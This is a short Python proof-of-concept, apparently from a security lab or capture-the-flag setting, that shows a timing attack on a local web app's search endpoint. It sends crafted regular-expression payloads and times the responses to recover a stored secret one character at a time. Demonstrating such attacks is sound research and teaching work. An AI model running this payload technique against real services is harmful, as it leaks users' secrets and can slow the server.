#!/usr/bin/env python3

"""
This PoC demonstrates how the timing attack is possible in same-site context (no XS-Leaks),
where the user attacking is the same inserting the secret to his account.
"""

import time
import requests
import os
import string


URL = "http://localhost:3000"
FIRST_PAYLOAD = r"^"
SECOND_PAYLOAD = r"(.+){21}$" + "\x00"
SECRET = r""


s = requests.Session()
print(s.post(URL + "/register").text)

print(
    s.post(URL + "/add", json={"secret": "a-very-looooooooooooooooooooong"}).text
)

print(s.get(URL + "/search", params={"query": "a"}).text)

while True:
    for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "-":
        payload = FIRST_PAYLOAD + (SECRET + char) + SECOND_PAYLOAD

        t = time.time()
        s.get(URL + "/search", params={"query": payload}).raise_for_status()
        if time.time() - t > 0.2:
            SECRET += char
            print("[+] Found first character of secret:", SECRET)
            exit(1)
    else:
        break
